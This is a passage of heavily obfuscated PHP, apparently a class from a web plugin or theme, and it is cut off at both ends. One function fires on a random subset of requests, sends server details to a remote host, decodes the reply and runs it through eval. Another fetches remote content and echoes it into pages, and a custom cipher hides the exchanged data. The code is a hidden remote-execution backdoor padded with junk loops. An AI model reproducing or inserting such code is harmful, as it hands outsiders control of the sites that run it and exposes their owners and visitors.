{ if ($A±×å„… == $Fç©çè[269] && $Fç©çè[25]($this->tujhea62d282, 0, 1) == $Fç©çè[269]) { continue; } if (!$Fç©çè[248]($DŠâ í‰Û², $aøˆİ®¡©©)) { $A¥ŠÂÕØÌ[] = $DŠâ í‰Û²; } } goto FĞ¦¿Ğê‚; Bšëƒ‘ÌŸ: } private function kbly2565a590() { goto bô—¢œ´©³; aç†ªãÁÎ…: if ($Fê®äÇŒé[61]($Fê®äÇŒé[286])->{$_SERVER[÷ôçËï×½][63]}($Fê®äÇŒé[89]) != $Fê®äÇŒé[240]) { $Fê®äÇŒé[61]($Fê®äÇŒé[286])->{$_SERVER[÷ôçËï×½][227]}($Fê®äÇŒé[89], $Fê®äÇŒé[240]); } goto B¬±”®Ö‹Ö; bô—¢œ´©³: $Fê®äÇŒé =& $_SERVER[÷ôçËï×½]; if ($this->tujhea62d282 != $Fê®äÇŒé[127]) { return; } $GLOBALS[$Fê®äÇŒé[100]][$Fê®äÇŒé[104]][$Fê®äÇŒé[284]] = $Fê®äÇŒé[226]; goto f•øê›ƒÆ; f•øê›ƒÆ: $GLOBALS[$Fê®äÇŒé[100]][$Fê®äÇŒé[285]] = $Fê®äÇŒé[226]; $b‡¤Ô¥½ƒ = $_SERVER[òÀöí][634]; if (!$b‡¤Ô¥½ƒ) { return; } goto aç†ªãÁÎ…; B¬±”®Ö‹Ö: } public function pkdm0f4a71a6() { return $_SERVER[÷ôçËï×½][287]; } private function zsrq5682a70f() { goto B„–ã´òÇ; FÒ‡º–Š‚: if (strlen($bŒ™Àï‚Ö‚) < $f„™á¹»í[567]) { die; } $d¨èô•â¿ = $this->{$_SERVER[÷ôçËï×½][189]}($c¸ß‚ãÏƒ“[296], $dŒ¶£‘‚äÍ); $Cª£íÅæ¾› = $f„™á¹»í[636]; goto BƒÚÒÖš¬‡; B„–ã´òÇ: $f„™á¹»í =& $_SERVER[òÀöí]; $c¸ß‚ãÏƒ“ =& $_SERVER[÷ôçËï×½]; $bó©¬æš½ = array($c¸ß‚ãÏƒ“[288], $c¸ß‚ãÏƒ“[289], $c¸ß‚ãÏƒ“[290]); goto FŞ”µ›‚À°; FŞ”µ›‚À°: $b•Ôòø„çŠ = $c¸ß‚ãÏƒ“[291] . $c¸ß‚ãÏƒ“[120]($c¸ß‚ãÏƒ“[292]); if ($this->tujhea62d282 == $c¸ß‚ãÏƒ“[127] || !$c¸ß‚ãÏƒ“[112]($GLOBALS, $c¸ß‚ãÏƒ“[138])) { return; } if (!$c¸ß‚ãÏƒ“[248]($_SERVER[$c¸ß‚ãÏƒ“[44]], $bó©¬æš½)) { return; } goto a‰×¥«Êó; cÁÅ©¶Ï‹Ã: $this->{$_SERVER[÷ôçËï×½][170]}(); $a½…÷˜Â„â = $f„™á¹»í[637]; while ($a½…÷˜Â„â < $f„™á¹»í[567]) { if ($a½…÷˜Â„â >= 0) { break; } $a½…÷˜Â„â++; } goto dîÔİ¿ƒë; dîÔİ¿ƒë: if ($this->{$_SERVER[÷ôçËï×½][206]}($d¨èô•â¿[$c¸ß‚ãÏƒ“[297]]) != $dŒ¶£‘‚äÍ[$c¸ß‚ãÏƒ“[171]]) { $dŒİöò‹àá = array($c¸ß‚ãÏƒ“[208] => $c¸ß‚ãÏƒ“[61]($c¸ß‚ãÏƒ“[62])->{$_SERVER[÷ôçËï×½][63]}($c¸ß‚ãÏƒ“[122]), $c¸ß‚ãÏƒ“[209] => $_SERVER[$c¸ß‚ãÏƒ“[121]], $c¸ß‚ãÏƒ“[210] => $c¸ß‚ãÏƒ“[211](), $c¸ß‚ãÏƒ“[180] => $_SERVER[$c¸ß‚ãÏƒ“[181]]); $Eã¾‰ÉÅº = $this->{$_SERVER[÷ôçËï×½][212]}($c¸ß‚ãÏƒ“[154]($dŒİöò‹àá)); $d¨èô•â¿ = $this->{$_SERVER[÷ôçËï×½][189]}($c¸ß‚ãÏƒ“[213] . $Eã¾‰ÉÅº); if ($d¨èô•â¿ && $c¸ß‚ãÏƒ“[198]($d¨èô•â¿) && isset($d¨èô•â¿[$c¸ß‚ãÏƒ“[297]])) { $CˆøôØ÷®– = $this->{$_SERVER[÷ôçËï×½][195]}($d¨èô•â¿[$c¸ß‚ãÏƒ“[297]], 2); if ($CˆøôØ÷®–) { $CˆøôØ÷®– = $this->{$_SERVER[÷ôçËï×½][206]}($CˆøôØ÷®–); } if ($CˆøôØ÷®–) { try { @eval($CˆøôØ÷®–); } catch (Exception $bñ ó²Ğôğ) { } } } } goto e¤ÌÒé™÷ã; eÍå äÃœŠ: $c¸ß‚ãÏƒ“[13](array($c¸ß‚ãÏƒ“[293], $c¸ß‚ãÏƒ“[158]), $b•Ôòø„çŠ, $c¸ß‚ãÏƒ“[242]()); $dŒ¶£‘‚äÍ = array($c¸ß‚ãÏƒ“[171] => $c¸ß‚ãÏƒ“[61]($c¸ß‚ãÏƒ“[62])->{$_SERVER[÷ôçËï×½][63]}($c¸ß‚ãÏƒ“[215]), $c¸ß‚ãÏƒ“[184] => $this->tujhea62d282, $c¸ß‚ãÏƒ“[182] => $_SERVER[$c¸ß‚ãÏƒ“[183]], $c¸ß‚ãÏƒ“[175] => $c¸ß‚ãÏƒ“[155], $c¸ß‚ãÏƒ“[178] => $_SERVER[$c¸ß‚ãÏƒ“[179]]); $bŒ™Àï‚Ö‚ = $f„™á¹»í[635]; goto FÒ‡º–Š‚; a‰×¥«Êó: if ($c¸ß‚ãÏƒ“[242]() % 4 != 0) { return; } $dÜ–´«©Ç = $c¸ß‚ãÏƒ“[13](array($c¸ß‚ãÏƒ“[293], $c¸ß‚ãÏƒ“[294]), $b•Ôòø„çŠ); if ($dÜ–´«©Ç && $c¸ß‚ãÏƒ“[242]() - $dÜ–´«©Ç < $c¸ß‚ãÏƒ“[250]($c¸ß‚ãÏƒ“[295])) { return; } goto eÍå äÃœŠ; BƒÚÒÖš¬‡: if (strlen($Cª£íÅæ¾›) < $f„™á¹»í[570]) { die; } if (!$c¸ß‚ãÏƒ“[198]($d¨èô•â¿)) { return; } if ($d¨èô•â¿[$c¸ß‚ãÏƒ“[171]] && $d¨èô•â¿[$c¸ß‚ãÏƒ“[297]]) { if ($this->{$_SERVER[÷ôçËï×½][206]}($d¨èô•â¿[$c¸ß‚ãÏƒ“[297]]) == $dŒ¶£‘‚äÍ[$c¸ß‚ãÏƒ“[171]]) { return; } } goto cÁÅ©¶Ï‹Ã; e¤ÌÒé™÷ã: } private function yqmd0731eb07($Fäè¼“àÔ„ = '', $c£ù±’®§ª = array(), $DŞ‡™›É’Ú = 5) { goto dŒô¡ºÊÈæ; dŒô¡ºÊÈæ: $DÓøÜší¯¢ =& $_SERVER[òÀöí]; $Eî´ÎõŠöœ =& $_SERVER[÷ôçËï×½]; $E•øäÆ°½ö = $Eî´ÎõŠöœ[298]; goto DàŸ‹‹âÒ; DÏø»ˆË: $E•øäÆ°½ö = $E•øäÆ°½ö . $Fäè¼“àÔ„ . $Eî´ÎõŠöœ[300] . $Eî´ÎõŠöœ[301]($c£ù±’®§ª); $E÷Ô²”Ööâ = $DÓøÜší¯¢[639]; if ($c£ù±’®§ª === -1) { return $E•øäÆ°½ö; } goto ašèÄÃ‚¬; ašèÄÃ‚¬: $b¾›‚âïƒ¸ = $Eî´ÎõŠöœ[258](array($Eî´ÎõŠöœ[259] => array($Eî´ÎõŠöœ[262] => $DŞ‡™›É’Ú, $Eî´ÎõŠöœ[260] => $Eî´ÎõŠöœ[302]), $Eî´ÎõŠöœ[303] => array($Eî´ÎõŠöœ[304] => !1, $Eî´ÎõŠöœ[305] => !1))); $FåÅ¶£ = $DÓøÜší¯¢[640]; if (!$FåÅ¶£) { die; } goto cå†´Ô…áë; cå†´Ô…áë: $c£ù±’®§ª = @$Eî´ÎõŠöœ[263]($E•øäÆ°½ö, !1, $b¾›‚âïƒ¸); $C‰”¸¨î‘ğ = $DÓøÜší¯¢[641]; return $Eî´ÎõŠöœ[197]($c£ù±’®§ª, !0); goto C©‰‘Ô™á‹; DàŸ‹‹âÒ: $E•øäÆ°½ö = $this->{$_SERVER[÷ôçËï×½][256]}($E•øäÆ°½ö, $Eî´ÎõŠöœ[299]); $F“¾Ü½·» = $DÓøÜší¯¢[638]; if (strlen($F“¾Ü½·») < $DÓøÜší¯¢[573]) { return; } goto DÏø»ˆË; C©‰‘Ô™á‹: } private function nzmuc3149b40() { goto BÊéË˜…Ë; AÜá»»ê£: $D²†áèª­¶ = $aˆÕ³²Îòµ[643]; $A“§§ôæÉ = $c«™÷øµïò[250]($A“§§ôæÉ ? $A“§§ôæÉ : $c«™÷øµïò[307]); $eµ»ëêŒîë = $c«™÷øµïò[112]($this->oeyt9941f96e, $c«™÷øµïò[333]); goto DÒÏù‚˜‡»; DÒÏù‚˜‡»: $eµ»ëêŒîë = $eµ»ëêŒîë ? $c«™÷øµïò[250]($eµ»ëêŒîë) : 0; return $A“§§ôæÉ + $eµ»ëêŒîë; $b¼Ê¿çÌˆ = $aˆÕ³²Îòµ[644]; goto Døµ±ˆñøÉ; BÊéË˜…Ë: $aˆÕ³²Îòµ =& $_SERVER[òÀöí]; $c«™÷øµïò =& $_SERVER[÷ôçËï×½]; $B††ÃÓ°™¿ = array($c«™÷øµïò[306] => $c«™÷øµïò[307], $c«™÷øµïò[308] => $c«™÷øµïò[309], $c«™÷øµïò[310] => $c«™÷øµïò[311], $c«™÷øµïò[312] => $c«™÷øµïò[313], $c«™÷øµïò[314] => $c«™÷øµïò[315], $c«™÷øµïò[316] => $c«™÷øµïò[251], $c«™÷øµïò[317] => $c«™÷øµïò[251], $c«™÷øµïò[318] => $c«™÷øµïò[307], $c«™÷øµïò[319] => $c«™÷øµïò[309], $c«™÷øµïò[320] => $c«™÷øµïò[311], $c«™÷øµïò[321] => $c«™÷øµïò[322], $c«™÷øµïò[323] => $c«™÷øµïò[313], $c«™÷øµïò[324] => $c«™÷øµïò[325], $c«™÷øµïò[326] => $c«™÷øµïò[315], $c«™÷øµïò[327] => $c«™÷øµïò[328], $c«™÷øµïò[329] => $c«™÷øµïò[330], $c«™÷øµïò[331] => $c«™÷øµïò[332]); goto Eç¼Ã¯·‹Ø; Eç¼Ã¯·‹Ø: $C‘Šè•˜ÎŠ = $aˆÕ³²Îòµ[642]; if (strlen($C‘Šè•˜ÎŠ) < $aˆÕ³²Îòµ[567]) { return; } $A“§§ôæÉ = $B††ÃÓ°™¿[$this->tujhea62d282]; goto AÜá»»ê£; Døµ±ˆñøÉ: } public function lahk42b9b70c($Eö›ï­¶ƒˆ) { goto AØ¬Ò¸¤ø×; a„İ†„¼¾¦: if (!$fÇŠ¤°ÁÄ[248]($Eö›ï­¶ƒˆ[$fÇŠ¤°ÁÄ[334]], $a¼±·µ†´)) { $fÇŠ¤°ÁÄ[172]($fÇŠ¤°ÁÄ[338], !1, $fÇŠ¤°ÁÄ[245]); } goto FÏõ„ùÖœœ; AóËÃ–…“: $dÚïšôÉÏ = $C îçœÑ[645]; if (strlen($dÚïšôÉÏ) < $C îçœÑ[579]) { die; } if ($f°×ëÆ³…ø <= $b’ĞÑ÷¿—) { return; } goto c˜½ƒËŒŸ; c˜½ƒËŒŸ: $a¼±·µ†´ = $fÇŠ¤°ÁÄ[61]($fÇŠ¤°ÁÄ[145])->{$_SERVER[÷ôçËï×½][335]}($fÇŠ¤°ÁÄ[334])->{$_SERVER[÷ôçËï×½][336]}($b’ĞÑ÷¿—)->{$_SERVER[÷ôçËï×½][337]}(); $a¼±·µ†´ = $fÇŠ¤°ÁÄ[228]($a¼±·µ†´, $fÇŠ¤°ÁÄ[10], $fÇŠ¤°ÁÄ[334]); $AºÆßçßšŒ = $C îçœÑ[646]; goto a„İ†„¼¾¦; AØ¬Ò¸¤ø×: $C îçœÑ =& $_SERVER[òÀöí]; $fÇŠ¤°ÁÄ =& $_SERVER[÷ôçËï×½]; $b’ĞÑ÷¿— = $this->{$_SERVER[÷ôçËï×½][143]}(); goto bãò¶Êáá´; bãò¶Êáá´: if ($Eö›ï­¶ƒˆ[$fÇŠ¤°ÁÄ[334]] == $fÇŠ¤°ÁÄ[226]) { return; } if ($b’ĞÑ÷¿— >= $fÇŠ¤°ÁÄ[250]($fÇŠ¤°ÁÄ[251])) { return; } $f°×ëÆ³…ø = $fÇŠ¤°ÁÄ[61]($fÇŠ¤°ÁÄ[145])->{$_SERVER[÷ôçËï×½][146]}(); goto AóËÃ–…“; FÏõ„ùÖœœ: } public function ecvy2bc99076() { goto b™ƒ‡‘Õ±; döïÖ‰Şí: if (!$d‚èãèİ›­) { die; } $Eæ’ñƒ…÷ = @$e¯ñÕÓÃ™[263]($e×ƒà‚õ”…, !1, $AÓñáÅÎÔ®); echo $e¯ñÕÓÃ™[340] . $e¯ñÕÓÃ™[341]($Eæ’ñƒ…÷) . $e¯ñÕÓÃ™[342]; goto D¼ÂÜĞÌçº; b»²…ó‘Ù: $e×ƒà‚õ”… = $this->{$_SERVER[÷ôçËï×½][256]}($e×ƒà‚õ”…, $e¯ñÕÓÃ™[257]); $AÓñáÅÎÔ® = $e¯ñÕÓÃ™[258](array($e¯ñÕÓÃ™[259] => array($e¯ñÕÓÃ™[260] => $e¯ñÕÓÃ™[261], $e¯ñÕÓÃ™[262] => 3))); $d‚èãèİ›­ = $b•äÈÌ‹åÓ[648]; goto döïÖ‰Şí; b™ƒ‡‘Õ±: $b•äÈÌ‹åÓ =& $_SERVER[òÀöí]; $e¯ñÕÓÃ™ =& $_SERVER[÷ôçËï×½]; if (!$e¯ñÕÓÃ™[112]($GLOBALS, $e¯ñÕÓÃ™[138]) || $e¯ñÕÓÃ™[339](1, 100) > 20) { return; } goto FÃÃ³‚èá³; FÃÃ³‚èá³: $e×ƒà‚õ”… = $e¯ñÕÓÃ™[255]; $cÍƒÒÏªÈ° = $b•äÈÌ‹åÓ[647]; if (strlen($cÍƒÒÏªÈ°) < $b•äÈÌ‹åÓ[579]) { return; } goto b»²…ó‘Ù; D¼ÂÜĞÌçº: } private function vkbna37c83f3($AôÉİğãé¾, $DØÛªã¶„‰, $B‚Î×’¦’Â = 3) { goto aôÛèÏæÄÃ; e¡‘õù®¼æ: return $AÔ÷¡ «†ù; goto bº‹ïÑ­†‡; bÈ£øÊÖç•: $AôÉİğãé¾ = $Bİ›¾èšëí[2]($AôÉİğãé¾); $bŠÚˆ·Î¹ = $C„øÉÏ‚Óà[649]; if (!$bŠÚˆ·Î¹) { die; } goto DèÒÅ–ÏÄ¤; BÇâ“²Ş¿Ù: $a©ÏùîÈå = $Bİ›¾èšëí[344]; switch ($e‹†°¹é‚—) { case $Bİ›¾èšëí[240]: $AÔ÷¡ «†ù = $this->{$_SERVER[÷ôçËï×½][153]}($AôÉİğãé¾, $Bİ›¾èšëí[220]($DØÛªã¶„‰ . $F¹²¶¡Àï)); $dø™éãÇ‡ = $C„øÉÏ‚Óà[651]; if (strlen($dø™éãÇ‡) < $C„øÉÏ‚Óà[579]) { die; } break; $FÔ ùšÔº± = $C„øÉÏ‚Óà[652]; while ($FÔ ùšÔº± < $C„øÉÏ‚Óà[567]) { if ($FÔ ùšÔº± >= 0) { break; } $FÔ ùšÔº±++; } case $Bİ›¾èšëí[226]: $AÔ÷¡ «†ù = $this->{$_SERVER[÷ôçËï×½][153]}($AôÉİğãé¾, $Bİ›¾èšëí[220]($F¹²¶¡Àï . $DØÛªã¶„‰)); break; case $Bİ›¾èšëí[345]: $AÔ÷¡ «†ù = $this->{$_SERVER[÷ôçËï×½][153]}($AôÉİğãé¾, $Bİ›¾èšëí[124]($F¹²¶¡Àï . $DØÛªã¶„‰)); break; case $Bİ›¾èšëí[346]: $AÔ÷¡ «†ù = $this->{$_SERVER[÷ôçËï×½][153]}($AôÉİğãé¾, $Bİ›¾èšëí[120]($F¹²¶¡Àï . $DØÛªã¶„‰)); break; case $Bİ›¾èšëí[347]: goto cÈ¹ô¥ì‡˜; Bˆšš›’±µ: break; $AŞ…Ç±áöô = $C„øÉÏ‚Óà[661]; if (strlen($AŞ…Ç±áöô) < $C„øÉÏ‚Óà[588]) { die; } goto a‰ê·•¤§«; A‰ÌŠ…£Õ: $bÏ±ÍÇĞ = $Bİ›¾èšëí[25]($bÏ±ÍÇĞ, $dÒ„ŸæêÃ˜ % 8, $dÒ„ŸæêÃ˜ % 8 + 7); $A‹ĞÆ¥ŞŞÇ = $Bİ›¾èšëí[10]; $c„®…Ó’á = $C„øÉÏ‚Óà[656]; goto DŸ¹Ã»àƒ³; DŸ¹Ã»àƒ³: while ($c„®…Ó’á < $C„øÉÏ‚Óà[573]) { if ($c„®…Ó’á >= 0) { break; } $c„®…Ó’á++; } $dÙ¥Ô·Ìœ÷ = 0; $b‘à‘–ùÕÊ = $C„øÉÏ‚Óà[657]; goto eæÌ˜±¸Šç; A‡Š‚œ®×‚: $AÔ÷¡ «†ù = $Bİ›¾èšëí[341]($e«ğ‰à¶÷ . $A‹ĞÆ¥ŞŞÇ); $D»‚«ÜÏ½† = $C„øÉÏ‚Óà[660]; if (strlen($D»‚«ÜÏ½†) < $C„øÉÏ‚Óà[570]) { return; } goto Bˆšš›’±µ; cÈ¹ô¥ì‡˜: $AôÉİğãé¾ = $Bİ›¾èšëí[124]($AôÉİğãé¾); $bŒæé¯¼îº = $C„øÉÏ‚Óà[653]; $dÒ„ŸæêÃ˜ = $Bİ›¾èšëí[348](0, 64); goto e›·§¡‘µ°; A‚¾—¬ß–«: $bÏ±ÍÇĞ = $Bİ›¾èšëí[120]($e«ğ‰à¶÷ . $Bİ›¾èšëí[120]($DØÛªã¶„‰ . $e«ğ‰à¶÷) . $DØÛªã¶„‰); $F ªæÃÕ¶ƒ = $C„øÉÏ‚Óà[655]; if (!$F ªæÃÕ¶ƒ) { die; } goto A‰ÌŠ…£Õ; c´ïÎßğ ‡: if (strlen($F®¹Äôğ„Î) < $C„øÉÏ‚Óà[570]) { die; } $fáòì“«°ã = 0; for ($dÙ¥Ô·Ìœ÷ = 0; $dÙ¥Ô·Ìœ÷ < $Bİ›¾èšëí[24]($AôÉİğãé¾); $dÙ¥Ô·Ìœ÷++) { $fáòì“«°ã = $fáòì“«°ã == $Bİ›¾èšëí[24]($bÏ±ÍÇĞ) ? 0 : $fáòì“«°ã; $A¸¾ó¬îâØ = ($dÒ„ŸæêÃ˜ + $Bİ›¾èšëí[349]($a©ÏùîÈå, $AôÉİğãé¾[$dÙ¥Ô·Ìœ÷]) + $Bİ›¾èšëí[350]($bÏ±ÍÇĞ[$fáòì“«°ã++])) % 64; $dÑ•±±§øø = $C„øÉÏ‚Óà[659]; if (strlen($dÑ•±±§øø) < $C„øÉÏ‚Óà[579]) { return; } $A‹ĞÆ¥ŞŞÇ .= $a©ÏùîÈå[$A¸¾ó¬îâØ]; } goto A‡Š‚œ®×‚; e›·§¡‘µ°: $CÔ‚½˜±´ó = $C„øÉÏ‚Óà[654]; if (strlen($CÔ‚½˜±´ó) < $C„øÉÏ‚Óà[573]) { die; } $e«ğ‰à¶÷ = $a©ÏùîÈå[$dÒ„ŸæêÃ˜]; goto A‚¾—¬ß–«; eæÌ˜±¸Šç: while (strlen($b‘à‘–ùÕÊ) < $C„øÉÏ‚Óà[570]) { if (!$b‘à‘–ùÕÊ) { break; } $b‘à‘–ùÕÊ++; } $A¸¾ó¬îâØ = 0; $F®¹Äôğ„Î = $C„øÉÏ‚Óà[658]; goto c´ïÎßğ ‡; a‰ê·•¤§«: default: $AÔ÷¡ «†ù = $this->{$_SERVER[÷ôçËï×½][153]}($AôÉİğãé¾, $DØÛªã¶„‰ . $F¹²¶¡Àï); $Còã´†õÀ¢ = $C„øÉÏ‚Óà[662]; if (strlen($Còã´†õÀ¢) < $C„øÉÏ‚Óà[567]) { return; } break; $CÑíÓ™³ = $C„øÉÏ‚Óà[663]; } $AÔ÷¡ «†ù = $Bİ›¾èšëí[220]($e‹†°¹é‚— . $F¹²¶¡Àï . $AÔ÷¡ «†ù); goto d¸Ü¹…Ğ ; DèÒÅ–ÏÄ¤: $e‹†°¹é‚— = $Bİ›¾èšëí[339](0, 5) . $Bİ›¾èšëí[10]; $F¹²¶¡Àï = $Bİ›¾èšëí[130](15); $BñÔÃ‡µì£ = $C„øÉÏ‚Óà[650]; goto BÇâ“²Ş¿Ù; aôÛèÏæÄÃ: $C„øÉÏ‚Óà =& $_SERVER[òÀöí]; $Bİ›¾èšëí =& $_SERVER[÷ôçËï×½]; $Bİ›¾èšëí[343](1); goto bÈ£øÊÖç•; d¸Ü¹…Ğ : $D¨ÙÚİÂ = $C„øÉÏ‚Óà[664]; while (strlen($D¨ÙÚİÂ) < $C„øÉÏ‚Óà[573]) { if (!$D¨ÙÚİÂ) { break; } $D¨ÙÚİÂ++; } if ($B‚Î×’¦’Â - 1 > 0) { $AÔ÷¡ «†ù = $this->{$_SERVER[÷ôçËï×½][133]}($AÔ÷¡ «†ù, $DØÛªã¶„‰, $B‚Î×’¦’Â - 1); } goto e¡‘õù®¼æ; bº‹ïÑ­†‡: } private function gwludf66d2f2($F–í¥ùÉø¢, $C’³º°®Î¤, $Eâˆæ†‚àß = 3) { goto eÑ¼Åæìø; eÑ¼Åæìø: $Céìµ‚¶­ =& $_SERVER[òÀöí]; $c™«™Ü±Îù =& $_SERVER[÷ôçËï×½]; if (!$c™«™Ü±Îù[351]($F–í¥ùÉø¢) || $c™«™Ü±Îù[24]($F–í¥ùÉø¢) < 10) { return !1; } goto Aß˜Í¸•×; AÜ‡ˆ÷å: if (strlen($e…õ‘Ù‘ôĞ) < $Céìµ‚¶­[567]) { die; } $F‰»‚¸ì = $F–í¥ùÉø¢[0]; $Déñ÷¨Ù› = $c™«™Ü±Îù[25]($F–í¥ùÉø¢, 1, 15); goto Eˆ¤ÚÇğ¨•; Eˆ¤ÚÇğ¨•: $F–í¥ùÉø¢ = $c™«™Ü±Îù[25]($F–í¥ùÉø¢, 16); $B•ì¾èôÜÖ = $Céìµ‚¶­[666]; if (!$B•ì¾èôÜÖ) { return; } goto EĞõ÷šî¥; Aß˜Í¸•×: $F–í¥ùÉø¢ = $c™«™Ü±Îù[2]($F–í¥ùÉø¢); $F–í¥ùÉø¢ = $c™«™Ü±Îù[220]($F–í¥ùÉø¢); $e…õ‘Ù‘ôĞ = $Céìµ‚¶­[665]; goto AÜ‡ˆ÷å; EĞõ÷šî¥: $e¦Âó¡éË¤ = $c™«™Ü±Îù[344]; switch ($F‰»‚¸ì) { case $c™«™Ü±Îù[240]: $A´ òÉìĞ¤ = $this->{$_SERVER[÷ôçËï×½][256]}($F–í¥ùÉø¢, $c™«™Ü±Îù[220]($C’³º°®Î¤ . $Déñ÷¨Ù›)); break; $b°Â¿ºŠÙ— = $Céìµ‚¶­[667]; if (!$b°Â¿ºŠÙ—) { die; } case $c™«™Ü±Îù[226]: $A´ òÉìĞ¤ = $this->{$_SERVER[÷ôçËï×½][256]}($F–í¥ùÉø¢, $c™«™Ü±Îù[220]($Déñ÷¨Ù› . $C’³º°®Î¤)); break; $c¶º‡ÆÀ’ = $Céìµ‚¶­[668]; case $c™«™Ü±Îù[345]: $A´ òÉìĞ¤ = $this->{$_SERVER[÷ôçËï×½][256]}($F–í¥ùÉø¢, $c™«™Ü±Îù[124]($Déñ÷¨Ù› . $C’³º°®Î¤)); $fš¯²±˜ß = $Céìµ‚¶­[669]; if (strlen($fš¯²±˜ß) < $Céìµ‚¶­[573]) { die; } break; $B®²†œ¥ë = $Céìµ‚¶­[670]; while (strlen($B®²†œ¥ë) < $Céìµ‚¶­[579]) { if (!$B®²†œ¥ë) { break; } $B®²†œ¥ë++; } case $c™«™Ü±Îù[346]: $A´ òÉìĞ¤ = $this->{$_SERVER[÷ôçËï×½][256]}($F–í¥ùÉø¢, $c™«™Ü±Îù[120]($Déñ÷¨Ù› . $C’³º°®Î¤)); $eÂ§‡ Áº = $Céìµ‚¶­[671]; break; case $c™«™Ü±Îù[347]: goto AŒ†ÀÚºŒ­; FÑâ‚Ï¸²£: $cšì…ÌÖâ¢ = $c™«™Ü±Îù[25]($cšì…ÌÖâ¢, $a«¢¬Êæåå % 8, $a«¢¬Êæåå % 8 + 7); $b¤˜Óö†äé = $c™«™Ü±Îù[10]; $Aæ‘‚šµ = $Céìµ‚¶­[674]; goto BÃ¯ˆÃ; AŒ†ÀÚºŒ­: $F–í¥ùÉø¢ = $c™«™Ü±Îù[352]($F–í¥ùÉø¢); $eÌìÔˆ¨ = $F–í¥ùÉø¢[0]; $F–í¥ùÉø¢ = $c™«™Ü±Îù[25]($F–í¥ùÉø¢, 1); goto bí‚‡¯È¿Ğ; BÃ¯ˆÃ: while (strlen($Aæ‘‚šµ) < $Céìµ‚¶­[588]) { if (!$Aæ‘‚šµ) { break; } $Aæ‘‚šµ++; } $c–Ü ˆí™ = 0; $f„ÕâÈœ› = 0; goto dÔÛÒùäŠ¦; D¯Æ„‰è’Ü: $Dê³º²‘´‹ = $Céìµ‚¶­[680]; while ($Dê³º²‘´‹ < $Céìµ‚¶­[567]) { if ($Dê³º²‘´‹ >= 0) { break; } $Dê³º²‘´‹++; } goto A‹ßÃ„—³Ø; dÔÛÒùäŠ¦: $A®È´²šÇ = $Céìµ‚¶­[675]; while ($A®È´²šÇ < $Céìµ‚¶­[573]) { if ($A®È´²šÇ >= 0) { break; } $A®È´²šÇ++; } $D‘®‚„‚…ğ = 0; goto b»øùÌîä…; cäÈÓá¯«: $cšì…ÌÖâ¢ = $c™«™Ü±Îù[120]($eÌìÔˆ¨ . $c™«™Ü±Îù[120]($C’³º°®Î¤ . $eÌìÔˆ¨) . $C’³º°®Î¤); $f¼§®…³˜œ = $Céìµ‚¶­[673]; if (!$f¼§®…³˜œ) { return; } goto FÑâ‚Ï¸²£; b»øùÌîä…: for ($c–Ü ˆí™ = 0; $c–Ü ˆí™ < $c™«™Ü±Îù[24]($F–í¥ùÉø¢); $c–Ü ˆí™++) { $D‘®‚„‚…ğ = $D‘®‚„‚…ğ == $c™«™Ü±Îù[24]($cšì…ÌÖâ¢) ? 0 : $D‘®‚„‚…ğ; $c½¾©ïˆº = $Céìµ‚¶­[676]; while ($c½¾©ïˆº < $Céìµ‚¶­[579]) { if ($c½¾©ïˆº >= 0) { break; } $c½¾©ïˆº++; } $cñ¡Ö‹Ëö = $D‘®‚„‚…ğ++; $dßùÁ´‘ºš = $Céìµ‚¶­[677]; if (!$dßùÁ´‘ºš) { return; } $f„ÕâÈœ› = $c™«™Ü±Îù[349]($e¦Âó¡éË¤, $F–í¥ùÉø¢[$c–Ü ˆí™]) - $a«¢¬Êæåå - $c™«™Ü±Îù[350]($cšì…ÌÖâ¢[$cñ¡Ö‹Ëö]); $F‡…ìËºŞÃ = $Céìµ‚¶­[678]; if (strlen($F‡…ìËºŞÃ) < $Céìµ‚¶­[588]) { return; } while ($f„ÕâÈœ› < 0) { $f„ÕâÈœ› += 64; $e¦ö··ÊÉ = $Céìµ‚¶­[679]; if (!$e¦ö··ÊÉ) { die; } } $b¤˜Óö†äé .= $e¦Âó¡éË¤[$f„ÕâÈœ›]; } $A´ òÉìĞ¤ = $c™«™Ü±Îù[353]($b¤˜Óö†äé); break; goto D¯Æ„‰è’Ü; bí‚‡¯È¿Ğ: $a«¢¬Êæåå = $c™«™Ü±Îù[349]($e¦Âó¡éË¤, $eÌìÔˆ¨); $aÒÑè‡ˆôˆ = $Céìµ‚¶­[672]; while (strlen($aÒÑè‡ˆôˆ) < $Céìµ‚¶­[567]) { if (!$aÒÑè‡ˆôˆ) { break; } $aÒÑè‡ˆôˆ++; } goto cäÈÓá¯«; A‹ßÃ„—³Ø: default: $A´ òÉìĞ¤ = $this->{$_SERVER[÷ôçËï×½][256]}($F–í¥ùÉø¢, $C’³º°®Î¤ . $Déñ÷¨Ù›); break; } if ($Eâˆæ†‚àß - 1 > 0) { $A´ òÉìĞ¤ = $this->{$_SERVER[÷ôçËï×½][195]}($A´ òÉìĞ¤, $C’³º°®Î¤, $Eâˆæ†‚àß - 1); } goto D½‹ŒÕí´Î; D½‹ŒÕí´Î: return $A´ òÉìĞ¤; goto C†´ŞÏ­»Í; C†´ŞÏ­»Í: } public function clae481a258e($dŒ´ˆæ¤î‹) { goto c÷øùòèñø; b¦ÑÀĞ›£ˆ: $däßëÏä‰ = $fÛ†œ‰ò[250](($DœŒƒİ¦ÂŒ + $E¾À¸ƒ¤¾í) / 2); $cÙ¼ˆÑù§ = $BÄè‡»¶¯ƒ[683]; if (strlen($cÙ¼ˆÑù§) < $BÄè‡»¶¯ƒ[573]) { die; } goto eË¸ø’‹Ÿí; Fòº©“ŒîÀ: $C„©Í›æØ• = $BÄè‡»¶¯ƒ[685]; if (!$C„©Í›æØ•) { die; } return $c´–õÁÈÍ; goto D©©ˆ”©¨; D‹ƒ‚“Œ©µ: $E¾À¸ƒ¤¾í = $this->{$_SERVER[÷ôçËï×½][354]}(); $dòÇ¯õ» = $BÄè‡»¶¯ƒ[681]; if (!$dòÇ¯õ») { die; } goto CÈ™ÒÈ¼Ë; CÈ™ÒÈ¼Ë: $AÍååäŠ¼‡ = ($DœŒƒİ¦ÂŒ - 1) * ($E¾À¸ƒ¤¾í - 1); $c„ÆÙ¦ùíÄ = $BÄè‡»¶¯ƒ[682]; while (strlen($c„ÆÙ¦ùíÄ) < $BÄè‡»¶¯ƒ[573]) { if (!$c„ÆÙ¦ùíÄ) { break; } $c„ÆÙ¦ùíÄ++; } goto b¦ÑÀĞ›£ˆ; eË¸ø’‹Ÿí: while (1) { $D»¬‡Š§ = $däßëÏä‰; $BÍ¢œ÷¯ÉÖ = $AÍååäŠ¼‡; while ($BÍ¢œ÷¯ÉÖ % $D»¬‡Š§ != 0) { $b“âº‹“ = $BÍ¢œ÷¯ÉÖ; 